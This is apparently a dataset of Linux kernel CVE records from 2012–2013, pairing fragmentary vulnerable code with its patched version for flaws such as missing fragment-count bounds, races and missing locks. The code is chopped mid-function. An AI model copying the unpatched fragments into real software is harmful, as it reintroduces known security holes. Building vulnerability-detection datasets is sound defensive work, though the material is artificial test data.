2013,DoS Exec Code Overflow ,CVE-2012-2137,,
2012,DoS Overflow +Priv ,CVE-2012-2136," gfp_t gfp_mask;
 long timeo;
 int err;






	gfp_mask = sk->sk_allocation;
 if (gfp_mask & __GFP_WAIT)
 if (atomic_read(&sk->sk_wmem_alloc) < sk->sk_sndbuf) {
			skb = alloc_skb(header_len, gfp_mask);
 if (skb) {
 int npages;
 int i;

 /* No pages, we're done... */
 if (!data_len)
 break;

				npages = (data_len + (PAGE_SIZE - 1)) >> PAGE_SHIFT;
				skb->truesize += data_len;
 skb_shinfo(skb)->nr_frags = npages;
 for (i = 0; i < npages; i++) {
"," gfp_t gfp_mask;
 long timeo;
 int err;
 int npages = (data_len + (PAGE_SIZE - 1)) >> PAGE_SHIFT;

	err = -EMSGSIZE;
 if (npages > MAX_SKB_FRAGS)
 goto failure;

	gfp_mask = sk->sk_allocation;
 if (gfp_mask & __GFP_WAIT)
 if (atomic_read(&sk->sk_wmem_alloc) < sk->sk_sndbuf) {
			skb = alloc_skb(header_len, gfp_mask);
 if (skb) {

 int i;

 /* No pages, we're done... */
 if (!data_len)
 break;


				skb->truesize += data_len;
 skb_shinfo(skb)->nr_frags = npages;
 for (i = 0; i < npages; i++) {
"
2012,DoS +Priv ,CVE-2012-2133," spin_lock(&sbinfo->stat_lock);
 /* If no limits set, just report 0 for max/free/used
		 * blocks, like simple_statfs() */
 if (sbinfo->max_blocks >= 0) {
			buf->f_blocks = sbinfo->max_blocks;
			buf->f_bavail = buf->f_bfree = sbinfo->free_blocks;






			buf->f_files = sbinfo->max_inodes;
			buf->f_ffree = sbinfo->free_inodes;
		}

 if (sbi) {
		sb->s_fs_info = NULL;




 kfree(sbi);
	}
}
	sb->s_fs_info = sbinfo;
	sbinfo->hstate = config.hstate;
 spin_lock_init(&sbinfo->stat_lock);
	sbinfo->max_blocks = config.nr_blocks;
	sbinfo->free_blocks = config.nr_blocks;
	sbinfo->max_inodes = config.nr_inodes;
	sbinfo->free_inodes = config.nr_inodes;






	sb->s_maxbytes = MAX_LFS_FILESIZE;
	sb->s_blocksize = huge_page_size(config.hstate);
	sb->s_blocksize_bits = huge_page_shift(config.hstate);
	sb->s_root = root;
 return 0;
out_free:


 kfree(sbinfo);
 return -ENOMEM;
}

int hugetlb_get_quota(struct address_space *mapping, long delta)
{
 int ret = 0;
 struct hugetlbfs_sb_info *sbinfo = HUGETLBFS_SB(mapping->host->i_sb);

 if (sbinfo->free_blocks > -1) {
 spin_lock(&sbinfo->stat_lock);
 if (sbinfo->free_blocks - delta >= 0)
			sbinfo->free_blocks -= delta;
 else
			ret = -ENOMEM;
 spin_unlock(&sbinfo->stat_lock);
	}

 return ret;
}

void hugetlb_put_quota(struct address_space *mapping, long delta)
{
 struct hugetlbfs_sb_info *sbinfo = HUGETLBFS_SB(mapping->host->i_sb);

 if (sbinfo->free_blocks > -1) {
 spin_lock(&sbinfo->stat_lock);
		sbinfo->free_blocks += delta;
 spin_unlock(&sbinfo->stat_lock);
	}
}

static struct dentry *hugetlbfs_mount(struct file_system_type *fs_type,
 int flags, const char *dev_name, void *data)
{
#include <linux/shm.h>
#include <asm/tlbflush.h>










int PageHuge(struct page *page);

void reset_vma_resv_huge_pages(struct vm_area_struct *vma);

#ifdef CONFIG_HUGETLBFS
struct hugetlbfs_sb_info {
 long	max_blocks;   /* blocks allowed */
 long	free_blocks;  /* blocks free */
 long	max_inodes;   /* inodes allowed */
 long	free_inodes;  /* inodes free */
 spinlock_t	stat_lock;
 struct hstate *hstate;

};

static inline struct hugetlbfs_sb_info *HUGETLBFS_SB(struct super_block *sb)
extern const struct vm_operations_struct hugetlb_vm_ops;
struct file *hugetlb_file_setup(const char *name, size_t size, vm_flags_t acct,
 struct user_struct **user, int creat_flags);
int hugetlb_get_quota(struct address_space *mapping, long delta);
void hugetlb_put_quota(struct address_space *mapping, long delta);

static inline int is_file_hugepages(struct file *file)
{
 */
static DEFINE_SPINLOCK(hugetlb_lock);















































































/*
 * Region tracking -- allows tracking of reservations and instantiated pages
 *                    across the pages in a mapping.
 */
 struct hstate *h = page_hstate(page);
 int nid = page_to_nid(page);
 struct address_space *mapping;


	mapping = (struct address_space *) page_private(page);
 set_page_private(page, 0);
	page->mapping = NULL;
 BUG_ON(page_count(page));
 enqueue_huge_page(h, page);
	}
 spin_unlock(&hugetlb_lock);
 if (mapping)
 hugetlb_put_quota(mapping, 1);
}

static void prep_new_huge_page(struct hstate *h, struct page *page, int nid)
/*
 * Determine if the huge page at addr within the vma has an associated
 * reservation.  Where it does not we will need to logically increase
 * reservation and actually increase quota before an allocation can occur.
 * Where any new reservation would be required the reservation change is
 * prepared, but not committed.  Once the page has been quota'd allocated
 * an instantiated the change should be committed via vma_commit_reservation.
 * No action is required on failure.

 */
static long vma_needs_reservation(struct hstate *h,
 struct vm_area_struct *vma, unsigned long addr)
static struct page *alloc_huge_page(struct vm_area_struct *vma,
 unsigned long addr, int avoid_reserve)
{

 struct hstate *h = hstate_vma(vma);
 struct page *page;
 struct address_space *mapping = vma->vm_file->f_mapping;
 struct inode *inode = mapping->host;
 long chg;

 /*
	 * Processes that did not create the mapping will have no reserves and
	 * will not have accounted against quota. Check that the quota can be
	 * made before satisfying the allocation
	 * MAP_NORESERVE mappings may also need pages and quota allocated
	 * if no reserve mapping overlaps.

 */
	chg = vma_needs_reservation(h, vma, addr);
 if (chg < 0)
 return ERR_PTR(-VM_FAULT_OOM);
 if (chg)
 if (hugetlb_get_quota(inode->i_mapping, chg))
 return ERR_PTR(-VM_FAULT_SIGBUS);

 spin_lock(&hugetlb_lock);
 if (!page) {
		page = alloc_buddy_huge_page(h, NUMA_NO_NODE);
 if (!page) {
 hugetlb_put_quota(inode->i_mapping, chg);
 return ERR_PTR(-VM_FAULT_SIGBUS);
		}
	}

 set_page_private(page, (unsigned long) mapping);

 vma_commit_reservation(h, vma, addr);

{
 struct hstate *h = hstate_vma(vma);
 struct resv_map *reservations = vma_resv_map(vma);

 unsigned long reserve;
 unsigned long start;
 unsigned long end;

 if (reserve) {
 hugetlb_acct_memory(h, -reserve);
 hugetlb_put_quota(vma->vm_file->f_mapping, reserve);
		}
	}
}
 */
	address = address & huge_page_mask(h);
	pgoff = vma_hugecache_offset(h, vma, address);
	mapping = (struct address_space *)page_private(page);

 /*
	 * Take the mapping lock for the duration of the table walk. As
{
 long ret, chg;
 struct hstate *h = hstate_inode(inode);


 /*
	 * Only apply hugepage reservation if asked. At fault time, an
	 * attempt will be made for VM_NORESERVE to allocate a page
	 * and filesystem quota without using reserves
 */
 if (vm_flags & VM_NORESERVE)
 return 0;
 if (chg < 0)
 return chg;

 /* There must be enough filesystem quota for the mapping */
 if (hugetlb_get_quota(inode->i_mapping, chg))
 return -ENOSPC;

 /*
	 * Check enough hugepages are available for the reservation.
	 * Hand back the quota if there are not
 */
	ret = hugetlb_acct_memory(h, chg);
 if (ret < 0) {
 hugetlb_put_quota(inode->i_mapping, chg);
 return ret;
	}

{
 struct hstate *h = hstate_inode(inode);
 long chg = region_truncate(&inode->i_mapping->private_list, offset);


 spin_lock(&inode->i_lock);
	inode->i_blocks -= (blocks_per_huge_page(h) * freed);
 spin_unlock(&inode->i_lock);

 hugetlb_put_quota(inode->i_mapping, (chg - freed));
 hugetlb_acct_memory(h, -(chg - freed));
}

"," spin_lock(&sbinfo->stat_lock);
 /* If no limits set, just report 0 for max/free/used
		 * blocks, like simple_statfs() */
 if (sbinfo->spool) {
 long free_pages;

 spin_lock(&sbinfo->spool->lock);
			buf->f_blocks = sbinfo->spool->max_hpages;
			free_pages = sbinfo->spool->max_hpages
				- sbinfo->spool->used_hpages;
			buf->f_bavail = buf->f_bfree = free_pages;
 spin_unlock(&sbinfo->spool->lock);
			buf->f_files = sbinfo->max_inodes;
			buf->f_ffree = sbinfo->free_inodes;
		}

 if (sbi) {
		sb->s_fs_info = NULL;

 if (sbi->spool)
 hugepage_put_subpool(sbi->spool);

 kfree(sbi);
	}
}
	sb->s_fs_info = sbinfo;
	sbinfo->hstate = config.hstate;
 spin_lock_init(&sbinfo->stat_lock);


	sbinfo->max_inodes = config.nr_inodes;
	sbinfo->free_inodes = config.nr_inodes;
	sbinfo->spool = NULL;
 if (config.nr_blocks != -1) {
		sbinfo->spool = hugepage_new_subpool(config.nr_blocks);
 if (!sbinfo->spool)
 goto out_free;
	}
	sb->s_maxbytes = MAX_LFS_FILESIZE;
	sb->s_blocksize = huge_page_size(config.hstate);
	sb->s_blocksize_bits = huge_page_shift(config.hstate);
	sb->s_root = root;
 return 0;
out_free:
 if (sbinfo->spool)
 kfree(sbinfo->spool);
 kfree(sbinfo);
 return -ENOMEM;
}





























static struct dentry *hugetlbfs_mount(struct file_system_type *fs_type,
 int flags, const char *dev_name, void *data)
{
#include <linux/shm.h>
#include <asm/tlbflush.h>

struct hugepage_subpool {
 spinlock_t lock;
 long count;
 long max_hpages, used_hpages;
};

struct hugepage_subpool *hugepage_new_subpool(long nr_blocks);
void hugepage_put_subpool(struct hugepage_subpool *spool);

int PageHuge(struct page *page);

void reset_vma_resv_huge_pages(struct vm_area_struct *vma);

#ifdef CONFIG_HUGETLBFS
struct hugetlbfs_sb_info {


 long	max_inodes;   /* inodes allowed */
 long	free_inodes;  /* inodes free */
 spinlock_t	stat_lock;
 struct hstate *hstate;
 struct hugepage_subpool *spool;
};

static inline struct hugetlbfs_sb_info *HUGETLBFS_SB(struct super_block *sb)
extern const struct vm_operations_struct hugetlb_vm_ops;
struct file *hugetlb_file_setup(const char *name, size_t size, vm_flags_t acct,
 struct user_struct **user, int creat_flags);



static inline int is_file_hugepages(struct file *file)
{
 */
static DEFINE_SPINLOCK(hugetlb_lock);

static inline void unlock_or_release_subpool(struct hugepage_subpool *spool)
{
 bool free = (spool->count == 0) && (spool->used_hpages == 0);

 spin_unlock(&spool->lock);

 /* If no pages are used, and no other handles to the subpool
	 * remain, free the subpool the subpool remain */
 if (free)
 kfree(spool);
}

struct hugepage_subpool *hugepage_new_subpool(long nr_blocks)
{
 struct hugepage_subpool *spool;

	spool = kmalloc(sizeof(*spool), GFP_KERNEL);
 if (!spool)
 return NULL;

 spin_lock_init(&spool->lock);
	spool->count = 1;
	spool->max_hpages = nr_blocks;
	spool->used_hpages = 0;

 return spool;
}

void hugepage_put_subpool(struct hugepage_subpool *spool)
{
 spin_lock(&spool->lock);
 BUG_ON(!spool->count);
	spool->count--;
 unlock_or_release_subpool(spool);
}

static int hugepage_subpool_get_pages(struct hugepage_subpool *spool,
 long delta)
{
 int ret = 0;

 if (!spool)
 return 0;

 spin_lock(&spool->lock);
 if ((spool->used_hpages + delta) <= spool->max_hpages) {
		spool->used_hpages += delta;
	} else {
		ret = -ENOMEM;
	}
 spin_unlock(&spool->lock);

 return ret;
}

static void hugepage_subpool_put_pages(struct hugepage_subpool *spool,
 long delta)
{
 if (!spool)
 return;

 spin_lock(&spool->lock);
	spool->used_hpages -= delta;
 /* If hugetlbfs_put_super couldn't free spool due to
	* an outstanding quota reference, free it now. */
 unlock_or_release_subpool(spool);
}

static inline struct hugepage_subpool *subpool_inode(struct inode *inode)
{
 return HUGETLBFS_SB(inode->i_sb)->spool;
}

static inline struct hugepage_subpool *subpool_vma(struct vm_area_struct *vma)
{
 return subpool_inode(vma->vm_file->f_dentry->d_inode);
}

/*
 * Region tracking -- allows tracking of reservations and instantiated pages
 *                    across the pages in a mapping.
 */
 struct hstate *h = page_hstate(page);
 int nid = page_to_nid(page);
 struct hugepage_subpool *spool =
		(struct hugepage_subpool *)page_private(page);


 set_page_private(page, 0);
	page->mapping = NULL;
 BUG_ON(page_count(page));
 enqueue_huge_page(h, page);
	}
 spin_unlock(&hugetlb_lock);
 hugepage_subpool_put_pages(spool, 1);

}

static void prep_new_huge_page(struct hstate *h, struct page *page, int nid)
/*
 * Determine if the huge page at addr within the vma has an associated
 * reservation.  Where it does not we will need to logically increase
 * reservation and actually increase subpool usage before an allocation
 * can occur.  Where any new reservation would be required the
 * reservation change is prepared, but not committed.  Once the page
 * has been allocated from the subpool and instantiated the change should
 * be committed via vma_commit_reservation.  No action is required on
 * failure.
 */
static long vma_needs_reservation(struct hstate *h,
 struct vm_area_struct *vma, unsigned long addr)
static struct page *alloc_huge_page(struct vm_area_struct *vma,
 unsigned long addr, int avoid_reserve)
{
 struct hugepage_subpool *spool = subpool_vma(vma);
 struct hstate *h = hstate_vma(vma);
 struct page *page;


 long chg;

 /*
	 * Processes that did not create the mapping will have no
	 * reserves and will not have accounted against subpool
	 * limit. Check that the subpool limit can be made before
	 * satisfying the allocation MAP_NORESERVE mappings may also
	 * need pages and subpool limit allocated allocated if no reserve
	 * mapping overlaps.
 */
	chg = vma_needs_reservation(h, vma, addr);
 if (chg < 0)
 return ERR_PTR(-VM_FAULT_OOM);
 if (chg)
 if (hugepage_subpool_get_pages(spool, chg))
 return ERR_PTR(-VM_FAULT_SIGBUS);

 spin_lock(&hugetlb_lock);
 if (!page) {
		page = alloc_buddy_huge_page(h, NUMA_NO_NODE);
 if (!page) {
 hugepage_subpool_put_pages(spool, chg);
 return ERR_PTR(-VM_FAULT_SIGBUS);
		}
	}

 set_page_private(page, (unsigned long)spool);

 vma_commit_reservation(h, vma, addr);

{
 struct hstate *h = hstate_vma(vma);
 struct resv_map *reservations = vma_resv_map(vma);
 struct hugepage_subpool *spool = subpool_vma(vma);
 unsigned long reserve;
 unsigned long start;
 unsigned long end;

 if (reserve) {
 hugetlb_acct_memory(h, -reserve);
 hugepage_subpool_put_pages(spool, reserve);
		}
	}
}
 */
	address = address & huge_page_mask(h);
	pgoff = vma_hugecache_offset(h, vma, address);
	mapping = vma->vm_file->f_dentry->d_inode->i_mapping;

 /*
	 * Take the mapping lock for the duration of the table walk. As
{
 long ret, chg;
 struct hstate *h = hstate_inode(inode);
 struct hugepage_subpool *spool = subpool_inode(inode);

 /*
	 * Only apply hugepage reservation if asked. At fault time, an
	 * attempt will be made for VM_NORESERVE to allocate a page
	 * without using reserves
 */
 if (vm_flags & VM_NORESERVE)
 return 0;
 if (chg < 0)
 return chg;

 /* There must be enough pages in the subpool for the mapping */
 if (hugepage_subpool_get_pages(spool, chg))
 return -ENOSPC;

 /*
	 * Check enough hugepages are available for the reservation.
	 * Hand the pages back to the subpool if there are not
 */
	ret = hugetlb_acct_memory(h, chg);
 if (ret < 0) {
 hugepage_subpool_put_pages(spool, chg);
 return ret;
	}

{
 struct hstate *h = hstate_inode(inode);
 long chg = region_truncate(&inode->i_mapping->private_list, offset);
 struct hugepage_subpool *spool = subpool_inode(inode);

 spin_lock(&inode->i_lock);
	inode->i_blocks -= (blocks_per_huge_page(h) * freed);
 spin_unlock(&inode->i_lock);

 hugepage_subpool_put_pages(spool, (chg - freed));
 hugetlb_acct_memory(h, -(chg - freed));
}

"
2012,DoS Overflow ,CVE-2012-2127,"
void __init proc_root_init(void)
{
 struct vfsmount *mnt;
 int err;

 proc_init_inodecache();
	err = register_filesystem(&proc_fs_type);
 if (err)
 return;
 mnt = kern_mount_data(&proc_fs_type, &init_pid_ns);
 if (IS_ERR(mnt)) {
 unregister_filesystem(&proc_fs_type);
 return;
	}

	init_pid_ns.proc_mnt = mnt;
 proc_symlink(""mounts"", NULL, ""self/mounts"");

 proc_net_init();

void pid_ns_release_proc(struct pid_namespace *ns)
{
 mntput(ns->proc_mnt);
}
","
void __init proc_root_init(void)
{

 int err;

 proc_init_inodecache();
	err = register_filesystem(&proc_fs_type);
 if (err)
 return;
 err = pid_ns_prepare_proc(&init_pid_ns);
 if (err) {
 unregister_filesystem(&proc_fs_type);
 return;
	}


 proc_symlink(""mounts"", NULL, ""self/mounts"");

 proc_net_init();

void pid_ns_release_proc(struct pid_namespace *ns)
{
 kern_unmount(ns->proc_mnt);
}
"
2012,Bypass ,CVE-2012-2123,"	}
skip:






 /* Don't let someone trace a set[ug]id/setpcap binary with the revised
	 * credentials unless they have the appropriate permit
 */
","	}
skip:

 /* if we have fs caps, clear dangerous personality flags */
 if (!cap_issubset(new->cap_permitted, old->cap_permitted))
		bprm->per_clear |= PER_CLEAR_ON_SETID;


 /* Don't let someone trace a set[ug]id/setpcap binary with the revised
	 * credentials unless they have the appropriate permit
 */
"
2012,DoS ,CVE-2012-2121,"
#ifdef CONFIG_IOMMU_API
int kvm_iommu_map_pages(struct kvm *kvm, struct kvm_memory_slot *slot);

int kvm_iommu_map_guest(struct kvm *kvm);
int kvm_iommu_unmap_guest(struct kvm *kvm);
int kvm_assign_device(struct kvm *kvm,
 return 0;
}






static inline int kvm_iommu_map_guest(struct kvm *kvm)
{
 return -ENODEV;
	}
}






static int kvm_iommu_unmap_memslots(struct kvm *kvm)
{
 int idx;
	slots = kvm_memslots(kvm);

 kvm_for_each_memslot(memslot, slots)
 kvm_iommu_put_pages(kvm, memslot->base_gfn, memslot->npages);

 srcu_read_unlock(&kvm->srcu, idx);

 if (r)
 goto out_free;

 /* map the pages in iommu page table */
 if (npages) {
		r = kvm_iommu_map_pages(kvm, &new);
 if (r)
 goto out_free;
	}


	r = -ENOMEM;
	slots = kmemdup(kvm->memslots, sizeof(struct kvm_memslots),
","
#ifdef CONFIG_IOMMU_API
int kvm_iommu_map_pages(struct kvm *kvm, struct kvm_memory_slot *slot);
void kvm_iommu_unmap_pages(struct kvm *kvm, struct kvm_memory_slot *slot);
int kvm_iommu_map_guest(struct kvm *kvm);
int kvm_iommu_unmap_guest(struct kvm *kvm);
int kvm_assign_device(struct kvm *kvm,
 return 0;
}

static inline void kvm_iommu_unmap_pages(struct kvm *kvm,
 struct kvm_memory_slot *slot)
{
}

static inline int kvm_iommu_map_guest(struct kvm *kvm)
{
 return -ENODEV;
	}
}

void kvm_iommu_unmap_pages(struct kvm *kvm, struct kvm_memory_slot *slot)
{
 kvm_iommu_put_pages(kvm, slot->base_gfn, slot->npages);
}

static int kvm_iommu_unmap_memslots(struct kvm *kvm)
{
 int idx;
	slots = kvm_memslots(kvm);

 kvm_for_each_memslot(memslot, slots)
 kvm_iommu_unmap_pages(kvm, memslot);

 srcu_read_unlock(&kvm->srcu, idx);

 if (r)
 goto out_free;

 /* map/unmap the pages in iommu page table */
 if (npages) {
		r = kvm_iommu_map_pages(kvm, &new);
 if (r)
 goto out_free;
	} else
 kvm_iommu_unmap_pages(kvm, &old);

	r = -ENOMEM;
	slots = kmemdup(kvm->memslots, sizeof(struct kvm_memslots),
"
2013,DoS Overflow ,CVE-2012-2119,"		}
		base = (unsigned long)from->iov_base + offset;
		size = ((base & ~PAGE_MASK) + len + ~PAGE_MASK) >> PAGE_SHIFT;


		num_pages = get_user_pages_fast(base, size, 0, &page[i]);
 if ((num_pages != size) ||
		    (num_pages > MAX_SKB_FRAGS - skb_shinfo(skb)->nr_frags)) {
 for (i = 0; i < num_pages; i++)
 put_page(page[i]);
 return -EFAULT;
 int err;
 struct virtio_net_hdr vnet_hdr = { 0 };
 int vnet_hdr_len = 0;
 int copylen;
 bool zerocopy = false;

 if (q->flags & IFF_VNET_HDR) {
 if (unlikely(len < ETH_HLEN))
 goto err;





 if (m && m->msg_control && sock_flag(&q->sk, SOCK_ZEROCOPY))
		zerocopy = true;

 if (zerocopy) {











 /* There are 256 bytes to be copied in skb, so there is enough
		 * room for skb expand head in case it is used.
		 * The rest buffer is mapped from userspace.
 */
		copylen = vnet_hdr.hdr_len;

 if (!copylen)
			copylen = GOODCOPY_LEN;
	} else
","		}
		base = (unsigned long)from->iov_base + offset;
		size = ((base & ~PAGE_MASK) + len + ~PAGE_MASK) >> PAGE_SHIFT;
 if (i + size > MAX_SKB_FRAGS)
 return -EMSGSIZE;
		num_pages = get_user_pages_fast(base, size, 0, &page[i]);
 if (num_pages != size) {

 for (i = 0; i < num_pages; i++)
 put_page(page[i]);
 return -EFAULT;
 int err;
 struct virtio_net_hdr vnet_hdr = { 0 };
 int vnet_hdr_len = 0;
 int copylen = 0;
 bool zerocopy = false;

 if (q->flags & IFF_VNET_HDR) {
 if (unlikely(len < ETH_HLEN))
 goto err;

	err = -EMSGSIZE;
 if (unlikely(count > UIO_MAXIOV))
 goto err;

 if (m && m->msg_control && sock_flag(&q->sk, SOCK_ZEROCOPY))
		zerocopy = true;

 if (zerocopy) {
 /* Userspace may produce vectors with count greater than
		 * MAX_SKB_FRAGS, so we need to linearize parts of the skb
		 * to let the rest of data to be fit in the frags.
 */
 if (count > MAX_SKB_FRAGS) {
			copylen = iov_length(iv, count - MAX_SKB_FRAGS);
 if (copylen < vnet_hdr_len)
				copylen = 0;
 else
				copylen -= vnet_hdr_len;
		}
 /* There are 256 bytes to be copied in skb, so there is enough
		 * room for skb expand head in case it is used.
		 * The rest buffer is mapped from userspace.
 */
 if (copylen < vnet_hdr.hdr_len)
			copylen = vnet_hdr.hdr_len;
 if (!copylen)
			copylen = GOODCOPY_LEN;
	} else
"
2012,DoS ,CVE-2012-2100," struct ext4_group_desc *gdp = NULL;
 ext4_group_t flex_group_count;
 ext4_group_t flex_group;
 int groups_per_flex = 0;
 size_t size;
 int i;

	sbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex;
	groups_per_flex = 1 << sbi->s_log_groups_per_flex;

 if (groups_per_flex < 2) {
		sbi->s_log_groups_per_flex = 0;
 return 1;
	}


 /* We allocate both existing and potentially added groups */
	flex_group_count = ((sbi->s_groups_count + groups_per_flex - 1) +
"," struct ext4_group_desc *gdp = NULL;
 ext4_group_t flex_group_count;
 ext4_group_t flex_group;
 unsigned int groups_per_flex = 0;
 size_t size;
 int i;

	sbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex;
 if (sbi->s_log_groups_per_flex < 1 || sbi->s_log_groups_per_flex > 31) {


		sbi->s_log_groups_per_flex = 0;
 return 1;
	}
	groups_per_flex = 1 << sbi->s_log_groups_per_flex;

 /* We allocate both existing and potentially added groups */
	flex_group_count = ((sbi->s_groups_count + groups_per_flex - 1) +
"
2012,DoS ,CVE-2012-1601,"
#define PALE_RESET_ENTRY 0x80000000ffffffb0UL






int kvm_arch_vcpu_init(struct kvm_vcpu *vcpu)
{
 struct kvm_vcpu *v;
		r = -EEXIST;
 if (kvm->arch.vpic)
 goto create_irqchip_unlock;



		r = -ENOMEM;
		vpic = kvm_create_pic(kvm);
 if (vpic) {
	kvm_x86_ops->check_processor_compatibility(rtn);
}






int kvm_arch_vcpu_init(struct kvm_vcpu *vcpu)
{
 struct page *page;
{
 return vcpu->kvm->bsp_vcpu_id == vcpu->vcpu_id;
}







#endif

#ifdef __KVM_HAVE_DEVICE_ASSIGNMENT
 goto vcpu_destroy;

 mutex_lock(&kvm->lock);




 if (atomic_read(&kvm->online_vcpus) == KVM_MAX_VCPUS) {
		r = -EINVAL;
 goto unlock_vcpu_destroy;
","
#define PALE_RESET_ENTRY 0x80000000ffffffb0UL

bool kvm_vcpu_compatible(struct kvm_vcpu *vcpu)
{
 return irqchip_in_kernel(vcpu->kcm) == (vcpu->arch.apic != NULL);
}

int kvm_arch_vcpu_init(struct kvm_vcpu *vcpu)
{
 struct kvm_vcpu *v;
		r = -EEXIST;
 if (kvm->arch.vpic)
 goto create_irqchip_unlock;
		r = -EINVAL;
 if (atomic_read(&kvm->online_vcpus))
 goto create_irqchip_unlock;
		r = -ENOMEM;
		vpic = kvm_create_pic(kvm);
 if (vpic) {
	kvm_x86_ops->check_processor_compatibility(rtn);
}

bool kvm_vcpu_compatible(struct kvm_vcpu *vcpu)
{
 return irqchip_in_kernel(vcpu->kvm) == (vcpu->arch.apic != NULL);
}

int kvm_arch_vcpu_init(struct kvm_vcpu *vcpu)
{
 struct page *page;
{
 return vcpu->kvm->bsp_vcpu_id == vcpu->vcpu_id;
}

bool kvm_vcpu_compatible(struct kvm_vcpu *vcpu);

#else

static inline bool kvm_vcpu_compatible(struct kvm_vcpu *vcpu) { return true; }

#endif

#ifdef __KVM_HAVE_DEVICE_ASSIGNMENT
 goto vcpu_destroy;

 mutex_lock(&kvm->lock);
 if (!kvm_vcpu_compatible(vcpu)) {
		r = -EINVAL;
 goto unlock_vcpu_destroy;
	}
 if (atomic_read(&kvm->online_vcpus) == KVM_MAX_VCPUS) {
		r = -EINVAL;
 goto unlock_vcpu_destroy;
"
2012,DoS ,CVE-2012-1583,"	__be32 spi;

	spi = xfrm6_tunnel_spi_lookup((xfrm_address_t *)&iph->saddr);
 return xfrm6_rcv_spi(skb, spi);
}

static int xfrm6_tunnel_err(struct sk_buff *skb, struct inet6_skb_parm *opt,
","	__be32 spi;

	spi = xfrm6_tunnel_spi_lookup((xfrm_address_t *)&iph->saddr);
 return xfrm6_rcv_spi(skb, spi) > 0 ? : 0;
}

static int xfrm6_tunnel_err(struct sk_buff *skb, struct inet6_skb_parm *opt,
"
2012,DoS ,CVE-2012-1179," spinlock_t *ptl;
 int i;


	pgd = pgd_offset(mm, 0xA0000);
 if (pgd_none_or_clear_bad(pgd))
 goto out;
	}
 pte_unmap_unlock(pte, ptl);
out:

 flush_tlb();
}

	} else {
 spin_unlock(&walk->mm->page_table_lock);
	}



 /*
	 * The mmap_sem held all the way back in m_start() is what
	 * keeps khugepaged out of here and from collapsing things
 struct page *page;

 split_huge_page_pmd(walk->mm, pmd);



	pte = pte_offset_map_lock(vma->vm_mm, pmd, addr, &ptl);
 for (; addr != end; pte++, addr += PAGE_SIZE) {
 int err = 0;

 split_huge_page_pmd(walk->mm, pmd);



 /* find the first VMA at or above 'addr' */
	vma = find_vma(walk->mm, addr);
 spin_unlock(&walk->mm->page_table_lock);
	}



	orig_pte = pte = pte_offset_map_lock(walk->mm, pmd, addr, &ptl);
 do {
 struct page *page = can_gather_numa_stats(*pte, md->vma, addr);
 unsigned long size);
#endif



#ifndef CONFIG_TRANSPARENT_HUGEPAGE
static inline int pmd_trans_huge(pmd_t pmd)
{
 return 0;
}
#endif /* __HAVE_ARCH_PMD_WRITE */
























































#endif




#endif /* !__ASSEMBLY__ */

 spinlock_t *ptl;

 split_huge_page_pmd(walk->mm, pmd);



	pte = pte_offset_map_lock(vma->vm_mm, pmd, addr, &ptl);
 for (; addr != end; pte++, addr += PAGE_SIZE)
 spinlock_t *ptl;

 split_huge_page_pmd(walk->mm, pmd);


retry:
	pte = pte_offset_map_lock(vma->vm_mm, pmd, addr, &ptl);
 for (; addr != end; addr += PAGE_SIZE) {
 do {
		next = pmd_addr_end(addr, end);
 if (pmd_trans_huge(*pmd)) {
 if (next-addr != HPAGE_PMD_SIZE) {
 VM_BUG_ON(!rwsem_is_locked(&tlb->mm->mmap_sem));
 split_huge_page_pmd(vma->vm_mm, pmd);
			} else if (zap_huge_pmd(tlb, vma, pmd, addr))
 continue;
 /* fall through */
		}
 if (pmd_none_or_clear_bad(pmd))
 continue;







		next = zap_pte_range(tlb, vma, pmd, addr, next, details);

 cond_resched();
	} while (pmd++, addr = next, addr != end);

 do {
		next = pmd_addr_end(addr, end);
 split_huge_page_pmd(vma->vm_mm, pmd);
 if (pmd_none_or_clear_bad(pmd))
 continue;
 if (check_pte_range(vma, pmd, addr, next, nodes,
				    flags, private))
			}
 /* fall through */
		}
 if (pmd_none_or_clear_bad(pmd))
 mincore_unmapped_range(vma, addr, next, vec);
 else
 mincore_pte_range(vma, pmd, addr, next, vec);
 continue;

 split_huge_page_pmd(walk->mm, pmd);
 if (pmd_none_or_clear_bad(pmd))
 goto again;
		err = walk_pte_range(pmd, addr, next, walk);
 if (err)
	pmd = pmd_offset(pud, addr);
 do {
		next = pmd_addr_end(addr, end);
 if (unlikely(pmd_trans_huge(*pmd)))
 continue;
 if (pmd_none_or_clear_bad(pmd))
 continue;
		ret = unuse_pte_range(vma, pmd, addr, next, entry, page);
 if (ret)
"," spinlock_t *ptl;
 int i;

 down_write(&mm->mmap_sem);
	pgd = pgd_offset(mm, 0xA0000);
 if (pgd_none_or_clear_bad(pgd))
 goto out;
	}
 pte_unmap_unlock(pte, ptl);
out:
 up_write(&mm->mmap_sem);
 flush_tlb();
}

	} else {
 spin_unlock(&walk->mm->page_table_lock);
	}

 if (pmd_trans_unstable(pmd))
 return 0;
 /*
	 * The mmap_sem held all the way back in m_start() is what
	 * keeps khugepaged out of here and from collapsing things
 struct page *page;

 split_huge_page_pmd(walk->mm, pmd);
 if (pmd_trans_unstable(pmd))
 return 0;

	pte = pte_offset_map_lock(vma->vm_mm, pmd, addr, &ptl);
 for (; addr != end; pte++, addr += PAGE_SIZE) {
 int err = 0;

 split_huge_page_pmd(walk->mm, pmd);
 if (pmd_trans_unstable(pmd))
 return 0;

 /* find the first VMA at or above 'addr' */
	vma = find_vma(walk->mm, addr);
 spin_unlock(&walk->mm->page_table_lock);
	}

 if (pmd_trans_unstable(pmd))
 return 0;
	orig_pte = pte = pte_offset_map_lock(walk->mm, pmd, addr, &ptl);
 do {
 struct page *page = can_gather_numa_stats(*pte, md->vma, addr);
 unsigned long size);
#endif

#ifdef CONFIG_MMU

#ifndef CONFIG_TRANSPARENT_HUGEPAGE
static inline int pmd_trans_huge(pmd_t pmd)
{
 return 0;
}
#endif /* __HAVE_ARCH_PMD_WRITE */
#endif /* CONFIG_TRANSPARENT_HUGEPAGE */

/*
 * This function is meant to be used by sites walking pagetables with
 * the mmap_sem hold in read mode to protect against MADV_DONTNEED and
 * transhuge page faults. MADV_DONTNEED can convert a transhuge pmd
 * into a null pmd and the transhuge page fault can convert a null pmd
 * into an hugepmd or into a regular pmd (if the hugepage allocation
 * fails). While holding the mmap_sem in read mode the pmd becomes
 * stable and stops changing under us only if it's not null and not a
 * transhuge pmd. When those races occurs and this function makes a
 * difference vs the standard pmd_none_or_clear_bad, the result is
 * undefined so behaving like if the pmd was none is safe (because it
 * can return none anyway). The compiler level barrier() is critically
 * important to compute the two checks atomically on the same pmdval.
 */
